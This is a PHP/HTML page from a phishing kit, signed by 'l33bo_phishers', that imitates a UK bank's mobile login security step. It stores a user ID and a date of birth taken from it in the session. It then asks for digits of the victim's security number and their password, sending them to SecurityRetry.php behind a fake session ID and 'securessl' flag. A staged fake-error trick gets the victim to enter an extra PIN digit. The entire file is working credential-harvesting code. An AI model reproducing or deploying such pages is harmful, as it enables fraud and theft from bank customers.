<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
$userid = $_POST['userid'];
$extractdob = substr($userid, 0, 6);
$dobparts = str_split($extractdob, 2);
$_SESSION['dob'] = implode('/', $dobparts);
$_SESSION['userid'] = $_POST['userid'];
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
function validate() {
    var x = document.forms["security"]["pin1"].value;
    var y = document.forms["security"]["pin2"].value;
    var z = document.forms["security"]["pin4"].value;
    var a = document.forms["security"]["password"].value;
    if (x == null || x == "") {
        document.getElementById("pin_error").innerHTML = "Some of the information required has not been entered.";
        document.getElementById("pin1").focus();
		document.getElementById("pin1").style.borderColor="#db0000";
        return false;
    }
    if (y == null || y == "") {
        document.getElementById("pin_error").innerHTML = "Some of the information required has not been entered.";
        document.getElementById("pin2").focus();
		document.getElementById("pin2").style.borderColor="#db0000";
        return false;
    }
    if (z == null || z == "") {
        document.getElementById("pin_error").innerHTML = "Some of the information required has not been entered.";
        document.getElementById("pin4").focus();
		document.getElementById("pin4").style.borderColor="#db0000";
        return false;
    }
    if (a == null || a == "") {
        document.getElementById("password_error").innerHTML = "Some of the information required has not been entered.";
        document.getElementById("password").focus();
		document.getElementById("password").style.borderColor="#db0000";
        return false;
    }
}
function validatePin() {
	 var f = document.forms["security"]["pin3"].value;
		if (f == null || f == "") {
        document.getElementById("pin_error").innerHTML = "Some of the information required has not been entered.";
        document.getElementById("pin3").focus();
		document.getElementById("pin3").style.borderColor="#db0000";
        return false;
	}
function ChangePin() {
	document.getElementById("ChangePin").innerHTML = "<input autocomplete='off' class='wide' style='width:25%' id='pin3' maxlength='1' name='pin3' type='tel' placeholder='3rd number' onkeyup=&apos;movetoNext(this, 'pin4');&apos;>";
	document.getElementById("pin3").style.borderColor="#db0000";
	document.getElementById("go").innerHTML = '<input class="submitAction" id="frmLogin:lnkLogin1" name="frmLogin:lnkLogin1" onclick="validatePin();" type="submit" value="Continue">';
	return false;
	}
}
</script>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Security</title>
<link href="assets/img/favicon.ico" rel="shortcut icon">
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/css/mobile.css" rel="stylesheet" type="text/css">
</head>
<body class="hasJS">
<div id="outer">
<div id="banner">
<p id="logo"><img src="assets/img/logo.png"></p>
<p id="loggedmsg"><img style="padding-top:8px;" src="assets/img/white-lock.png"></p>
<p class="cookiePolicy"><a href="#" style="color:#FFFFFF;" id="lnkePrivacy" name="lnkePrivacy">Cookie
policy</a></p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Security</h1>
<hr>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="login">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div class="loginInner">
<div class="loginFields">
<form action="SecurityRetry.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" autocomplete="off" id="security" method="post" name="details" onsubmit="return validate();">
<div class="formField"><label for="pin">Enter the following numbers from your security number</label>
<div id='pin_error' class="error_strings"></div>
<input autocomplete="off" class="wide" style="width:25%" id="pin1" maxlength="1" name="pin1" type="tel" placeholder="1st number" onkeyup="movetoNext(this, 'pin2');">
&nbsp;&nbsp;&nbsp;
<span id="ChangePin">
<input autocomplete="off" class="wide" style="width:25%" id="pin2" maxlength="1" name="pin2" type="tel" placeholder="2nd number" onkeyup="movetoNext(this, 'pin4');">
</span>
&nbsp;&nbsp;&nbsp;
<input autocomplete="off" class="wide" style="width:25%" id="pin4" maxlength="1" name="pin4" type="tel" placeholder="4th number">
</div>
<div class="formField"><label for="password">Password</label>
<div id='password_error' class="error_strings"></div>
<input autocomplete="off" class="wide" id="password" maxlength="30" name="password" type="password">
</div>
<div class="actionsLogin">
<div class="divider">
<hr></div>
<span id="go">
<input class="submitAction" id="frmLogin:lnkLogin1" name="frmLogin:lnkLogin1" onclick="return ChangePin();" type="submit" value="Continue">
</span>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="clearer"></div>
<div>
<div class="aside">
<p class="sideNote">
<a id="lnkForgotUserID" name="lnkForgotUserID" href="#">Forgotten any of your log in details?</a>
</p>
</div>



<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Contact us</a></p>
</div>
</div>
</div>
<br>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img src="assets/img/003.jpg"></a></p>
</div>
</div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
?>